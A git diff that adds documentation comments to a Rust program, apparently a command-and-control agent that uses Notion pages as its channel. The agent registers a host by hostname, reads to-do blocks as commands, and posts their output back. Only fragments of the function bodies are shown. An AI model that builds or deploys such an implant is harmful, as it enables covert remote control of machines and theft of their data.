@@ -17,6 +17,14 @@ use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
 const URL_BASE: &str = "https://api.notion.com/v1";
 // const API_KEY_URL: &str = "http://localhost:8888";
 
+
+/// Storing Config Options as a struct for ergonomics.
+/// 
+/// sleep_interval: u64 for use with `std::thread::sleep()`
+/// 
+/// parent_page_id: String which eventually can be added at compile
+/// 
+/// api_key: String also added at compile
 #[derive(Debug)]
 struct ConfigOptions {
     sleep_interval: u64,
@@ -24,6 +32,10 @@ struct ConfigOptions {
     api_key: String
 }
 
+/// Retrieves config options from the terminal.
+/// 
+/// This is tricky because the terminal doesn't async in a normal way. That's why
+/// it's invoked with a tokio::spawn to encapsulate the work in an async thread.
 fn get_config_options() -> Result<ConfigOptions, Box<dyn Error + Send + Sync>> {
    
     println!("Getting config options!");
@@ -53,6 +65,10 @@ fn get_config_options() -> Result<ConfigOptions, Box<dyn Error + Send + Sync>> {
     )
 }
 
+/// Creates a new C2 page in Notion.
+/// 
+/// The returned value is the id of the new page, to be used with
+/// `doc::get_blocks()`
 async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String) -> Option<String> {
     println!("Creating page...");
     let url = format!("{}/pages/", URL_BASE);
@@ -86,6 +102,8 @@ async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: 
     None
 }
 
+/// Retrieves blocks from Notion. All children blocks of the parent page returned
+/// TODO: Account for pagination for > 100 children.
 async fn get_blocks(client: &Client, page_id: &String) -> Result<serde_json::Value, String> {
     let url = format!("{URL_BASE}/blocks/{page_id}/children");
 
@@ -105,6 +123,7 @@ async fn get_blocks(client: &Client, page_id: &String) -> Result<serde_json::Val
     Err(r.text().await.unwrap())
 }
 
+/// Marks a job done by making the to-do item checked.
 async fn complete_command(client: &Client, mut command_block: serde_json::Value) {
     
     // Set completed status
@@ -123,6 +142,7 @@ async fn complete_command(client: &Client, mut command_block: serde_json::Value)
     }
 }
 
+/// Sends the result of a command back to the to-do block that made the request.
 async fn send_result(client: &Client, command_block_id: &str, output: String) {
     let url = format!("{URL_BASE}/blocks/{command_block_id}/children");
     let body : serde_json::Value = json!({
